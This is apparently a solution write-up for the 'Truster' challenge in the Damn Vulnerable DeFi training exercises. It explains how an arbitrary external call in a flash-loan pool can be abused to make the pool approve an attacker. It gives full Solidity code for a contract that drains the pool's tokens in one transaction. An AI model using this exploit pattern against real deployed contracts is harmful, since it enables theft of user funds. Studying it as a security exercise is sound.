
# What is Damn Vulnerable DeFi?

The Damn Vulnerable DeFi Challenge is a set of educational exercises designed to teach participants about common vulnerabilities in decentralized finance (DeFi) protocols. Through hands-on practice,
participants exploit simulated vulnerabilities in a controlled environment, learning about security pitfalls and best practices in smart contract development and blockchain security.

This challenge helps developers, auditors, and enthusiasts understand the intricacies of DeFi security by engaging them in real-world attack scenarios and defenses.


# `Truster` Challenge Solution:

if we take a look at `TrusterLenderPool` Contract, the `TrusterLenderPool::flashloan()` function makes an external call to given `target` and what you should keep in mind, if we have an function that makes external call to any Contract, the `msg.sender` is the Contract itself, in this case `msg.sender` is the `TrusterLenderPool` Contract.

Now We Should Keep in Mind what available functions are there to be called?

- We Can Create Our Contract so `TrusterLenderPool` Contract, calls one of our functions.
- We Can Call `DamnValuableToken` token functions which is basically `ERC20` functions.
  
the thing you should keep in mind to pass this challenge is, we should find a single line solution so we can pass the `assertEq(vm.getNonce(player), 1, "Player executed more than one tx");` assertion inside the `Truster.t.sol::_isSolved()` function which basically checks our Nonce Number and should be `1`. also the `TrusterLenderPool` token balance should be sent to `Truster::recovery` address to pass this challenge, keep it in mind.

since any external calls made from `TrusterLenderPool::flashoan()` function, the `msg.sender` is the `TrusterLenderPool` Contract, we can take advantage of it and increase someone else
allowance amount with `approve()` function.

first lets see how basic everyday `approve()` function works:


```javascript
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;
    }
```

the `tokenHolder(msg.sender)` sets the `spender` allowance amount.

now if we pass `token` which is the `DamnValueAbleToken` and `approve(recovery, 1_000_000e18)` as `data` to `TrusterLenderPool::flashoan()` function, we can then use `transferFrom()` as `vm.prank(recovery)` to steal the `pool` Balance. but in this case all of the things we do should be as `vm.prank(player)` and not change it and also the solution should be done in single transaction, in this solution i gave as `vm.prank(recovery)` that was `2` transactions.

#### How we Can Achieve this with Single Transaction and Pass the Challenge?


if we Create a Contract that does all of this inside the `constructor()` we can pass this challenge successfully with single transaction `(vm.getNonce(player) == 1)`.

Our Contract will Looks like this:

```javascript
    contract FlashLoanTaker {

    uint256 private constant TOKENS_IN_POOL = 1_000_000e18; // current balance of `TrusterLenderPool`.

    address recovery;                                       // recovery address is the address we should send the tokens to after stealing it.
    TrusterLenderPool pool;                                 // `TrusterLenderPool` Contract.
    DamnValuableToken token;                                // `DamnValuableToken` token Contract.

    constructor(address _recovery, TrusterLenderPool _pool, DamnValuableToken _token) {
        recovery = _recovery;
        pool = _pool;
        token = _token;

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);  // the function `target` should call.
        pool.flashLoan(TOKENS_IN_POOL, address(pool), address(token), data);    // take flashloan and set the `borrower` to `pool` and call `approve(address(this), 1_000_000e18)`.
                                                                    // since we have set the receiver to `borrower`, we don't need to return tokens.
                                                                    // current allowance of `address(this)` is `1_000_000e18`. so we can use `transferFrom(pool, recovery, 1_000_000e18)`
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL); 
    }
}
```

add following line to `Truster.t.sol::test_truster()` to pass this challenge:

```diff
    function test_truster() public checkSolvedByPlayer {
+       FlashLoanTaker flashLoanTaker = new FlashLoanTaker(recovery, pool, token);
    }
```

then run the test:

```javascript
    forge test --match-test test_truster -vvvv
```

boom! you passed the challenge.